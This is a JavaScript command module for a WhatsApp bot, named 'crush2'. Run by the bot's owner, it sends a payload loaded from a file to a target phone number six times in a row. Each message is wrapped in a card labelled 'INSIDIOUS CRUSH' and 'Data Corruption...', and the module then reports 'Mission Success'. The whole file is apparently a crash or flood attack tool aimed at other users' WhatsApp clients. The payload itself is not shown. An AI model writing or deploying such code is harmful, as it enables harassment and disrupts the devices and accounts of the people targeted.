const fs = require('fs');
const config = require('../../config');
const { fancy } = require('../../lib/tools');

module.exports = {
    name: "crush2",
    execute: async (conn, msg, args, { from, isOwner }) => {
        if (!isOwner) return;
        let target = args[0]?.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        const payload = fs.readFileSync('./lib/payloads/crush2.txt', 'utf-8');

        for (let i = 0; i < 6; i++) {
            await conn.sendPresenceUpdate('composing', target);
            await conn.sendMessage(target, { 
                text: "\u200B" + payload,
                contextInfo: { 
                    externalAdReply: { title: "🥀 INSIDIOUS CRUSH 🥀", body: "Data Corruption...", mediaType: 1, thumbnailUrl: config.menuImage },
                    forwardedNewsletterMessageInfo: { newsletterJid: config.newsletterJid }
                } 
            });
        }
        await conn.sendMessage(conn.user.id, { text: fancy("🥀 Mission Success: CRUSH2 Deployed.") });
    }
};
